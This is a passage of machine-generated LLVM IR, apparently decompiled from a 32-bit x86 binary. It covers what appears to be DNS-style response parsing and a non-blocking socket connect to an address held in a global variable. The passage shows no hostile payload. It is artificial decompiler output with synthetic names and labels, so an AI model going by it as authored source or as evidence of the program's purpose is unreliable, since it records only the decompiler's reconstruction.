  br i1 %v4_804f6b826, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader.preheader

dec_label_pc_804f6bc.preheader.preheader:         ; preds = %dec_label_pc_804f6ad
  %v1_804f6dd = add i32 %v0_804f652127, 32
  br label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f6bc.preheader:                   ; preds = %dec_label_pc_804f6bc.preheader.preheader, %dec_label_pc_804f738
  %v0_804f73c = phi i32 [ %v3_804f73c, %dec_label_pc_804f738 ], [ 1, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f73962 = phi i32 [ %v0_804f739, %dec_label_pc_804f738 ], [ 0, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6c558 = phi i32 [ %v1_804f738, %dec_label_pc_804f738 ], [ %v1_804f6a4, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6bc56 = phi i32 [ %v6_804f6b6, %dec_label_pc_804f738 ], [ %v6_804f6b625, %dec_label_pc_804f6bc.preheader.preheader ]
  br label %dec_label_pc_804f6bc

dec_label_pc_804f6bc:                             ; preds = %dec_label_pc_804f6bc.preheader, %dec_label_pc_804f6c0
  %v0_804f739 = phi i32 [ %v0_804f73962, %dec_label_pc_804f6bc.preheader ], [ 1, %dec_label_pc_804f6c0 ]
  %v0_804f738 = phi i32 [ %v0_804f6c558, %dec_label_pc_804f6bc.preheader ], [ %v2_804f6e1, %dec_label_pc_804f6c0 ]
  %v4_804f6b6 = phi i32 [ %v0_804f6bc56, %dec_label_pc_804f6bc.preheader ], [ %v6_804f6e3, %dec_label_pc_804f6c0 ]
  %v1_804f6bc = trunc i32 %v4_804f6b6 to i8
  %tmp140 = icmp ult i8 %v1_804f6bc, -64
  br i1 %tmp140, label %dec_label_pc_804f738, label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f6c0 = urem i32 %v4_804f6b6, 256
  store i32 %v1_804f6c0, i32* %eax.global-to-local, align 4
  %v1_804f6c5 = add i32 %v0_804f738, 1
  %v2_804f6c5 = inttoptr i32 %v1_804f6c5 to i8*
  %v3_804f6c5 = load i8, i8* %v2_804f6c5, align 1
  %v4_804f6c5 = zext i8 %v3_804f6c5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804f6d3 = mul nuw nsw i32 %v1_804f6c0, 256
  %v2_804f6d6 = add nsw i32 %v2_804f6d3, -49152
  %v3_804f6d6 = or i32 %v4_804f6c5, %v2_804f6d6
  store i32 %v3_804f6d6, i32* %eax.global-to-local, align 4
  %v2_804f6e1 = add i32 %v1_804f6dd, %v3_804f6d6
  store i32 %v2_804f6e1, i32* %edx.global-to-local, align 4
  %v1_804f6e3 = inttoptr i32 %v2_804f6e1 to i8*
  %v2_804f6e3 = load i8, i8* %v1_804f6e3, align 1
  %v3_804f6e3 = zext i8 %v2_804f6e3 to i32
  %v6_804f6e3 = or i32 %v3_804f6e3, %v2_804f6d6
  store i32 %v6_804f6e3, i32* %eax.global-to-local, align 4
  %v4_804f6e5 = icmp eq i8 %v2_804f6e3, 0
  %v1_804f6e7 = icmp eq i1 %v4_804f6e5, false
  br i1 %v1_804f6e7, label %dec_label_pc_804f6bc, label %dec_label_pc_804f6e9

dec_label_pc_804f6e9:                             ; preds = %dec_label_pc_804f738, %dec_label_pc_804f6c0, %dec_label_pc_804f6ad
  %v1_804f6e9 = phi i32 [ 0, %dec_label_pc_804f6ad ], [ 1, %dec_label_pc_804f6c0 ], [ %v0_804f739, %dec_label_pc_804f738 ]
  %v0_804f6e9 = phi i32 [ 1, %dec_label_pc_804f6ad ], [ %v0_804f73c, %dec_label_pc_804f6c0 ], [ %v3_804f73c, %dec_label_pc_804f738 ]
  %v2_804f6e9 = add i32 %v0_804f6e9, %v1_804f6e9
  store i32 %v2_804f6e9, i32* @ebx, align 4
  %v2_804f6eb = add i32 %v2_804f6e9, %v1_804f6a4
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f64d.backedge:                    ; preds = %dec_label_pc_804f6e9, %dec_label_pc_804f760
  %v0_804f64d = phi i32 [ %v0_804f652127, %dec_label_pc_804f6e9 ], [ %v0_804f64d.pre, %dec_label_pc_804f760 ]
  %storemerge = phi i32 [ %v2_804f6eb, %dec_label_pc_804f6e9 ], [ %v2_804f76b, %dec_label_pc_804f760 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804f64d = add i32 %v0_804f64d, 22
  %v2_804f64d = inttoptr i32 %v1_804f64d to i16*
  %v3_804f64d = load i16, i16* %v2_804f64d, align 2
  %v4_804f64d = add i16 %v3_804f64d, -1
  store i16 %v4_804f64d, i16* %v2_804f64d, align 2
  %v0_804f652 = load i32, i32* @esp, align 4
  %v1_804f652 = add i32 %v0_804f652, 22
  %v2_804f652 = inttoptr i32 %v1_804f652 to i16*
  %v3_804f652 = load i16, i16* %v2_804f652, align 2
  %v13_804f652 = icmp eq i16 %v3_804f652, -1
  br i1 %v13_804f652, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f5e4
  %v1_804f6f3 = add i32 %v2_804f5f0, 4
  %v2_804f6f3 = inttoptr i32 %v1_804f6f3 to i32*
  %v3_804f6f3 = load i32, i32* %v2_804f6f3, align 4
  store i32 %v3_804f6f3, i32* %eax.global-to-local, align 4
  %v1_804f6f6 = icmp eq i32 %v3_804f6f3, 0
  br i1 %v1_804f6f6, label %dec_label_pc_804f706, label %dec_label_pc_804f6fa

dec_label_pc_804f6fa:                             ; preds = %dec_label_pc_804f6f3
  %v3_804f6fd = inttoptr i32 %v0_804f5ed to i32*
  store i32 %v3_804f6f3, i32* %v3_804f6fd, align 4
  %v1_804f6fe = call i32 @function_8053939(i32 1)
  store i32 %v1_804f6fe, i32* %eax.global-to-local, align 4
  %v0_804f703 = load i32, i32* @esp, align 4
  %v1_804f703 = add i32 %v0_804f703, 16
  br label %dec_label_pc_804f706

dec_label_pc_804f706:                             ; preds = %dec_label_pc_804f6f3, %dec_label_pc_804f6fa
  %v0_804f706 = phi i32 [ %v1_804f5ed, %dec_label_pc_804f6f3 ], [ %v1_804f703, %dec_label_pc_804f6fa ]
  %v2_804f709 = inttoptr i32 %v0_804f706 to i32*
  %v3_804f709 = load i32, i32* %v2_804f709, align 4
  store i32 %v3_804f709, i32* @esi, align 4
  %v2_804f70d = add i32 %v0_804f706, -16
  %v3_804f70d = inttoptr i32 %v2_804f70d to i32*
  store i32 %v3_804f709, i32* %v3_804f70d, align 4
  %v1_804f70e = call i32 @function_8053939(i32 1)
  store i32 %v1_804f70e, i32* %eax.global-to-local, align 4
  %v0_804f713 = load i32, i32* @esp, align 4
  %v1_804f713 = add i32 %v0_804f713, 16
  %v2_804f713 = inttoptr i32 %v1_804f713 to i32*
  store i32 0, i32* %v2_804f713, align 4
  %v0_804f71b = load i32, i32* @esp, align 4
  %v1_804f71b = add i32 %v0_804f71b, 16
  %v1_804f71e = inttoptr i32 %v1_804f71b to i32*
  %v2_804f71e = load i32, i32* %v1_804f71e, align 4
  store i32 %v2_804f71e, i32* %eax.global-to-local, align 4
  %v1_804f721 = add i32 %v0_804f71b, 4300
  %v1_804f727 = inttoptr i32 %v1_804f721 to i32*
  %v2_804f727 = load i32, i32* %v1_804f727, align 4
  store i32 %v2_804f727, i32* @ebx, align 4
  %v3_804f728 = add i32 %v0_804f71b, 4308
  %v1_804f729 = inttoptr i32 %v3_804f728 to i32*
  %v2_804f729 = load i32, i32* %v1_804f729, align 4
  store i32 %v2_804f729, i32* @edi, align 4
  %v3_804f729 = add i32 %v0_804f71b, 4312
  %v1_804f72a = inttoptr i32 %v3_804f729 to i32*
  %v2_804f72a = load i32, i32* %v1_804f72a, align 4
  store i32 %v2_804f72a, i32* @ebp, align 4
  ret i32 %v2_804f71e

dec_label_pc_804f72c:                             ; preds = %dec_label_pc_804f669
  %v1_804f72c = add i32 %v0_804f72c, 1
  store i32 %v1_804f72c, i32* %edx.global-to-local, align 4
  %v5_804f72d = icmp eq i32 %v0_804f72d, 0
  %v2_804f730 = zext i1 %v5_804f72d to i32
  %v3_804f730 = add i32 %v2_804f730, %v0_804f730
  %v1_804f663 = inttoptr i32 %v1_804f72c to i8*
  %v2_804f663 = load i8, i8* %v1_804f663, align 1
  %v3_804f663 = zext i8 %v2_804f663 to i32
  %v5_804f663 = and i32 %v4_804f663, -256
  %v6_804f663 = or i32 %v3_804f663, %v5_804f663
  store i32 %v6_804f663, i32* %eax.global-to-local, align 4
  %v4_804f665 = icmp eq i8 %v2_804f663, 0
  br i1 %v4_804f665, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader

dec_label_pc_804f738:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f738 = add i32 %v0_804f738, 1
  store i32 %v1_804f738, i32* %edx.global-to-local, align 4
  %v5_804f739 = icmp eq i32 %v0_804f739, 0
  %v2_804f73c = zext i1 %v5_804f739 to i32
  %v3_804f73c = add i32 %v2_804f73c, %v0_804f73c
  %v1_804f6b6 = inttoptr i32 %v1_804f738 to i8*
  %v2_804f6b6 = load i8, i8* %v1_804f6b6, align 1
  %v3_804f6b6 = zext i8 %v2_804f6b6 to i32
  %v5_804f6b6 = and i32 %v4_804f6b6, -256
  %v6_804f6b6 = or i32 %v3_804f6b6, %v5_804f6b6
  store i32 %v6_804f6b6, i32* %eax.global-to-local, align 4
  %v4_804f6b8 = icmp eq i8 %v2_804f6b6, 0
  br i1 %v4_804f6b8, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f69a
  %v1_804f744 = add i32 %v2_804f69c, 2
  %v2_804f744 = inttoptr i32 %v1_804f744 to i16*
  %v3_804f744 = load i16, i16* %v2_804f744, align 2
  %v9_804f744 = icmp eq i16 %v3_804f744, 256
  %v1_804f74a = icmp eq i1 %v9_804f744, false
  br i1 %v1_804f74a, label %dec_label_pc_804f6ad, label %dec_label_pc_804f750

dec_label_pc_804f750:                             ; preds = %dec_label_pc_804f744
  %v1_804f750 = add i32 %v2_804f69c, 8
  %v2_804f750 = inttoptr i32 %v1_804f750 to i16*
  %v3_804f750 = load i16, i16* %v2_804f750, align 2
  %v4_804f750 = zext i16 %v3_804f750 to i32
  %v6_804f750 = and i32 %v5_804f750, -65536
  %v7_804f750 = or i32 %v4_804f750, %v6_804f750
  store i32 %v7_804f750, i32* %edx.global-to-local, align 4
  %v2_804f756 = call i16 @llvm.bswap.i16(i16 %v3_804f750)
  %v3_804f756 = zext i16 %v2_804f756 to i32
  %v6_804f756 = or i32 %v3_804f756, %v6_804f750
  store i32 %v6_804f756, i32* %eax.global-to-local, align 4
  %v10_804f75a = icmp eq i16 %v3_804f750, 1024
  br i1 %v10_804f75a, label %dec_label_pc_804f773, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f750, %dec_label_pc_804f773
  %v0_804f64d.pre = phi i32 [ %v0_804f652127, %dec_label_pc_804f750 ], [ %v0_804f64d.pre.pre, %dec_label_pc_804f773 ]
  %v0_804f76b = phi i32 [ %v1_804f6a4, %dec_label_pc_804f750 ], [ %v0_804f76b.pre, %dec_label_pc_804f773 ]
  %v0_804f760 = phi i32 [ %v7_804f750, %dec_label_pc_804f750 ], [ %v7_804f7d7, %dec_label_pc_804f773 ]
  %v1_804f760 = trunc i32 %v0_804f760 to i16
  %v2_804f760 = call i16 @llvm.bswap.i16(i16 %v1_804f760)
  %v3_804f760 = zext i16 %v2_804f760 to i32
  %v5_804f760 = and i32 %v0_804f760, -65536
  %v6_804f760 = or i32 %v3_804f760, %v5_804f760
  store i32 %v6_804f760, i32* %edx.global-to-local, align 4
  store i32 %v3_804f760, i32* %eax.global-to-local, align 4
  %v2_804f76b = add i32 %v3_804f760, %v0_804f76b
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f750
  %v2_804f773 = inttoptr i32 %v1_804f6a4 to i8*
  %v3_804f773 = load i8, i8* %v2_804f773, align 1
  %v4_804f773 = zext i8 %v3_804f773 to i32
  %v6_804f773 = and i32 %v6_804f756, -256
  %v7_804f773 = or i32 %v4_804f773, %v6_804f773
  store i32 %v7_804f773, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804f778 = add i32 %v0_804f652127, 4280
  %v4_804f778 = inttoptr i32 %v3_804f778 to i8*
  store i8 %v3_804f773, i8* %v4_804f778, align 1
  %v0_804f77f = load i32, i32* @edi, align 4
  %v1_804f77f = add i32 %v0_804f77f, 1
  %v2_804f77f = inttoptr i32 %v1_804f77f to i8*
  %v3_804f77f = load i8, i8* %v2_804f77f, align 1
  %v4_804f77f = zext i8 %v3_804f77f to i32
  %v5_804f77f = load i32, i32* %eax.global-to-local, align 4
  %v6_804f77f = and i32 %v5_804f77f, -256
  %v7_804f77f = or i32 %v6_804f77f, %v4_804f77f
  store i32 %v7_804f77f, i32* %eax.global-to-local, align 4
  %v2_804f782 = load i32, i32* @esp, align 4
  %v3_804f782 = add i32 %v2_804f782, 4281
  %v4_804f782 = inttoptr i32 %v3_804f782 to i8*
  store i8 %v3_804f77f, i8* %v4_804f782, align 1
  %v0_804f789 = load i32, i32* @edi, align 4
  %v1_804f789 = add i32 %v0_804f789, 2
  %v2_804f789 = inttoptr i32 %v1_804f789 to i8*
  %v3_804f789 = load i8, i8* %v2_804f789, align 1
  %v4_804f789 = zext i8 %v3_804f789 to i32
  %v5_804f789 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f789 = and i32 %v5_804f789, -256
  %v7_804f789 = or i32 %v6_804f789, %v4_804f789
  store i32 %v7_804f789, i32* %eax.global-to-local, align 4
  %v2_804f78c = load i32, i32* @esp, align 4
  %v3_804f78c = add i32 %v2_804f78c, 4282
  %v4_804f78c = inttoptr i32 %v3_804f78c to i8*
  store i8 %v3_804f789, i8* %v4_804f78c, align 1
  %v0_804f793 = load i32, i32* @edi, align 4
  %v1_804f793 = add i32 %v0_804f793, 3
  %v2_804f793 = inttoptr i32 %v1_804f793 to i8*
  %v3_804f793 = load i8, i8* %v2_804f793, align 1
  %v4_804f793 = zext i8 %v3_804f793 to i32
  %v5_804f793 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f793 = and i32 %v5_804f793, -256
  %v7_804f793 = or i32 %v6_804f793, %v4_804f793
  store i32 %v7_804f793, i32* %eax.global-to-local, align 4
  %v2_804f796 = load i32, i32* @esp, align 4
  %v3_804f796 = add i32 %v2_804f796, 4283
  %v4_804f796 = inttoptr i32 %v3_804f796 to i8*
  store i8 %v3_804f793, i8* %v4_804f796, align 1
  %v0_804f79d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f79d = load i32, i32* @esp, align 4
  %v2_804f79d = add i32 %v1_804f79d, -4
  %v3_804f79d = inttoptr i32 %v2_804f79d to i32*
  store i32 %v0_804f79d, i32* %v3_804f79d, align 4
  %v0_804f79e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f79e = add i32 %v1_804f79d, -8
  %v3_804f79e = inttoptr i32 %v2_804f79e to i32*
  store i32 %v0_804f79e, i32* %v3_804f79e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804f7a1 = inttoptr i32 %v1_804f79d to i32*
  %v3_804f7a1 = load i32, i32* %v2_804f7a1, align 4
  store i32 %v3_804f7a1, i32* @edx, align 4
  %v1_804f7a5 = inttoptr i32 %v3_804f7a1 to i8*
  %v2_804f7a5 = load i8, i8* %v1_804f7a5, align 1
  %v3_804f7a5 = zext i8 %v2_804f7a5 to i32
  %v1_804f7a7 = mul nuw nsw i32 %v3_804f7a5, 4
  %v2_804f7a7 = add nuw nsw i32 %v1_804f7a7, 4
  store i32 %v2_804f7a7, i32* %eax.global-to-local, align 4
  %v2_804f7ae = add i32 %v1_804f79d, -12
  %v3_804f7ae = inttoptr i32 %v2_804f7ae to i32*
  store i32 %v2_804f7a7, i32* %v3_804f7ae, align 4
  %v0_804f7af = load i32, i32* @edx, align 4
  %v1_804f7af = add i32 %v0_804f7af, 4
  %v2_804f7af = inttoptr i32 %v1_804f7af to i32*
  %v3_804f7af = load i32, i32* %v2_804f7af, align 4
  store i32 %v3_804f7af, i32* %eax.global-to-local, align 4
  %v2_804f7b2 = add i32 %v1_804f79d, -16
  %v3_804f7b2 = inttoptr i32 %v2_804f7b2 to i32*
  store i32 %v3_804f7af, i32* %v3_804f7b2, align 4
  %v0_804f7b3 = call i32 @function_80533dc()
  store i32 %v0_804f7b3, i32* %eax.global-to-local, align 4
  %v0_804f7b8 = load i32, i32* @esp, align 4
  %v1_804f7b8 = add i32 %v0_804f7b8, 16
  %v2_804f7b8 = inttoptr i32 %v1_804f7b8 to i32*
  %v3_804f7b8 = load i32, i32* %v2_804f7b8, align 4
  store i32 %v3_804f7b8, i32* %ecx.global-to-local, align 4
  %v1_804f7bc = inttoptr i32 %v3_804f7b8 to i8*
  %v2_804f7bc = load i8, i8* %v1_804f7bc, align 1
  %v3_804f7bc = zext i8 %v2_804f7bc to i32
  %v4_804f7bc = load i32, i32* @edx, align 4
  %v5_804f7bc = and i32 %v4_804f7bc, -256
  %v6_804f7bc = or i32 %v5_804f7bc, %v3_804f7bc
  store i32 %v6_804f7bc, i32* %edx.global-to-local, align 4
  %v2_804f7be = add i32 %v3_804f7b8, 4
  %v3_804f7be = inttoptr i32 %v2_804f7be to i32*
  store i32 %v0_804f7b3, i32* %v3_804f7be, align 4
  %v0_804f7c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7c1 = urem i32 %v0_804f7c1, 256
  %v2_804f7c1 = load i32, i32* @ebx, align 4
  %v3_804f7c1 = and i32 %v2_804f7c1, -256
  %v4_804f7c1 = or i32 %v3_804f7c1, %v1_804f7c1
  store i32 %v4_804f7c1, i32* @ebx, align 4
  %v0_804f7c3 = load i32, i32* @esp, align 4
  %v1_804f7c3 = add i32 %v0_804f7c3, 4296
  %v2_804f7c3 = inttoptr i32 %v1_804f7c3 to i32*
  %v3_804f7c3 = load i32, i32* %v2_804f7c3, align 4
  store i32 %v3_804f7c3, i32* %ecx.global-to-local, align 4
  %v1_804f7ca = add i32 %v0_804f7c1, 1
  store i32 %v1_804f7ca, i32* %edx.global-to-local, align 4
  %v3_804f7cb = mul i32 %v4_804f7c1, 4
  %v4_804f7cb = add i32 %v3_804f7cb, %v0_804f7b3
  %v5_804f7cb = inttoptr i32 %v4_804f7cb to i32*
  store i32 %v3_804f7c3, i32* %v5_804f7cb, align 4
  %v0_804f7ce = load i32, i32* @esp, align 4
  %v1_804f7ce = add i32 %v0_804f7ce, 16
  %v2_804f7ce = inttoptr i32 %v1_804f7ce to i32*
  %v3_804f7ce = load i32, i32* %v2_804f7ce, align 4
  store i32 %v3_804f7ce, i32* %eax.global-to-local, align 4
  %v0_804f7d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7d5 = trunc i32 %v0_804f7d5 to i8
  %v3_804f7d5 = inttoptr i32 %v3_804f7ce to i8*
  store i8 %v1_804f7d5, i8* %v3_804f7d5, align 1
  %v0_804f7d7 = load i32, i32* @esi, align 4
  %v1_804f7d7 = add i32 %v0_804f7d7, 8
  %v2_804f7d7 = inttoptr i32 %v1_804f7d7 to i16*
  %v3_804f7d7 = load i16, i16* %v2_804f7d7, align 2
  %v4_804f7d7 = zext i16 %v3_804f7d7 to i32
  %v5_804f7d7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f7d7 = and i32 %v5_804f7d7, -65536
  %v7_804f7d7 = or i32 %v6_804f7d7, %v4_804f7d7
  store i32 %v7_804f7d7, i32* %edx.global-to-local, align 4
  %v0_804f76b.pre = load i32, i32* @edi, align 4
  %v0_804f64d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f760

; uselistorder directives
  uselistorder i32 %v7_804f7d7, { 1, 0 }
  uselistorder i32 %v0_804f7c1, { 1, 0 }
  uselistorder i32 %v3_804f760, { 0, 2, 1 }
  uselistorder i32 %v0_804f760, { 1, 0 }
  uselistorder i32 %v6_804f6b6, { 1, 0 }
  uselistorder i32 %v3_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f738, { 1, 2, 0 }
  uselistorder i32 %v6_804f663, { 2, 1, 0 }
  uselistorder i32 %v3_804f730, { 1, 0 }
  uselistorder i32 %v1_804f72c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804f706, { 1, 0 }
  uselistorder i32 %v0_804f652, { 2, 1, 0 }
  uselistorder i32 %v6_804f6e3, { 1, 0 }
  uselistorder i32 %v2_804f6e1, { 1, 2, 0 }
  uselistorder i32 %v3_804f6d6, { 1, 0 }
  uselistorder i32 %v4_804f6b6, { 1, 0, 2 }
  uselistorder i32 %v0_804f739, { 2, 0, 1 }
  uselistorder i32 %v0_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f6a4, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804f694, { 0, 2, 1 }
  uselistorder i32 %v2_804f692, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804f687, { 1, 0 }
  uselistorder i32 %v4_804f663, { 1, 0, 2 }
  uselistorder i32 %v0_804f72d, { 2, 0, 1 }
  uselistorder i32 %v0_804f730, { 1, 0 }
  uselistorder i32 %v6_804f66316, { 1, 0, 2 }
  uselistorder i32 %v0_804f65a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f652127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804f652122, { 0, 2, 1 }
  uselistorder i32 %v1_804f623, { 1, 0 }
  uselistorder i32 %v0_804f61f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804f61a, { 1, 0, 2 }
  uselistorder i32 %v0_804f5ed, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804f5ae, { 1, 0 }
  uselistorder i32 %v0_804f55f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804f55a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f527, { 1, 0 }
  uselistorder i32 %v2_804f524, { 1, 0 }
  uselistorder i32 %v0_804f520, { 1, 0 }
  uselistorder i32 %v1_804f50d, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804f501, { 1, 0 }
  uselistorder i32 %v0_804f4fe, { 2, 0, 1 }
  uselistorder i32 %v0_804f4e9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804f4c7, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804f4a8, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804f4a3, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f488, { 1, 0 }
  uselistorder i32 %v2_804f40f, { 1, 0 }
  uselistorder i32 %v1_804f401, { 1, 0 }
  uselistorder i32 %v1_804f3a3, { 1, 0 }
  uselistorder i8 %v2_804f392, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804f38c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804f360, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 29, 18, 19, 20, 21, 22, 23, 24, 1, 26, 27, 28, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8053d90, { 6, 0, 2, 5, 4, 3, 1 }
  uselistorder i32 (i8*)* @function_8051c40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 0, 71, 72, 73 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f706, { 1, 0 }
  uselistorder label %dec_label_pc_804f64d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f669, { 1, 0 }
  uselistorder label %dec_label_pc_804f669.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f65a, { 1, 0 }
  uselistorder label %dec_label_pc_804f5e4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f49c, { 1, 0 }
  uselistorder label %dec_label_pc_804f392, { 1, 0 }
}

define i32 @function_804f800() local_unnamed_addr {
dec_label_pc_804f800:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804f800 = load i32, i32* @ebx, align 4
  %v0_804f801 = load i32, i32* @eax, align 4
  store i32 %v0_804f801, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f826 = add i32 %v0_804f801, 4
  %v2_804f826 = inttoptr i32 %v1_804f826 to i32*
  %v3_804f826 = load i32, i32* %v2_804f826, align 4
  %v10_804f829 = icmp eq i32 %v3_804f826, -1
  br i1 %v10_804f829, label %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, label %dec_label_pc_804f82e

dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge: ; preds = %dec_label_pc_804f800
  br label %dec_label_pc_804f83a

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f800
  %v1_804f832 = call i32 @function_80521e1(i32 %v3_804f826)
  br label %dec_label_pc_804f83a

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, %dec_label_pc_804f82e
  %v3_804f841 = call i32 @function_80529d5(i32 2, i32 1, i32 0)
  %v1_804f849 = load i32, i32* @ebx, align 4
  %v2_804f849 = add i32 %v1_804f849, 4
  %v3_804f849 = inttoptr i32 %v2_804f849 to i32*
  store i32 %v3_804f841, i32* %v3_804f849, align 4
  %v8_804f84c = icmp eq i32 %v3_804f841, -1
  br i1 %v8_804f84c, label %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, label %dec_label_pc_804f84f

dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge: ; preds = %dec_label_pc_804f83a
  br label %dec_label_pc_804f8c3

dec_label_pc_804f84f:                             ; preds = %dec_label_pc_804f83a
  %v0_804f851 = load i32, i32* @ebx, align 4
  %v1_804f851 = add i32 %v0_804f851, 28
  store i32 %v1_804f851, i32* @eax, align 4
  %v1_804f859 = add i32 %v0_804f851, 24
  %v2_804f859 = inttoptr i32 %v1_804f859 to i32*
  store i32 0, i32* %v2_804f859, align 4
  %v0_804f860 = load i32, i32* @eax, align 4
  %v2_804f861 = call i32 @function_8051cd0(i32 %v0_804f860, i32 256)
  %v0_804f869 = load i32, i32* @ebx, align 4
  %v1_804f869 = add i32 %v0_804f869, 4
  %v2_804f869 = inttoptr i32 %v1_804f869 to i32*
  %v3_804f869 = load i32, i32* %v2_804f869, align 4
  %v3_804f871 = call i32 @function_805211d(i32 %v3_804f869, i32 3, i32 0)
  %v0_804f879 = load i32, i32* @ebx, align 4
  %v1_804f879 = add i32 %v0_804f879, 4
  %v2_804f879 = inttoptr i32 %v1_804f879 to i32*
  %v3_804f879 = load i32, i32* %v2_804f879, align 4
  %v12_804f87c = or i32 %v3_804f871, 2048
  %v3_804f883 = call i32 @function_805211d(i32 %v3_804f879, i32 4, i32 %v12_804f87c)
  %v0_804f888 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804f89e = load i32, i32* @global_var_8056910.34, align 16
  %v2_804f8a3 = add i32 %v0_804f888, 8
  %v3_804f8a3 = inttoptr i32 %v2_804f8a3 to i32*
  store i32 %v0_804f89e, i32* %v3_804f8a3, align 4
  %v2_804f8a6 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804f8ad = load i32, i32* @ebx, align 4
  %v1_804f8ad = add i32 %v0_804f8ad, 4
  %v2_804f8ad = inttoptr i32 %v1_804f8ad to i32*
  %v3_804f8ad = load i32, i32* %v2_804f8ad, align 4
  store i32 %v3_804f8ad, i32* %edx.global-to-local, align 4
  %v1_804f8b0 = add i32 %v0_804f8ad, 12
  %v2_804f8b0 = inttoptr i32 %v1_804f8b0 to i32*
  store i32 1, i32* %v2_804f8b0, align 4
  %v0_804f8ba = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8bb = call i32 @function_80527fa(i32 %v0_804f8ba, i32 %v2_804f8a6, i32 16)
  br label %dec_label_pc_804f8c3

dec_label_pc_804f8c3:                             ; preds = %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, %dec_label_pc_804f84f
  %v0_804f8c7 = phi i32 [ 0, %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge ], [ %v3_804f8bb, %dec_label_pc_804f84f ]
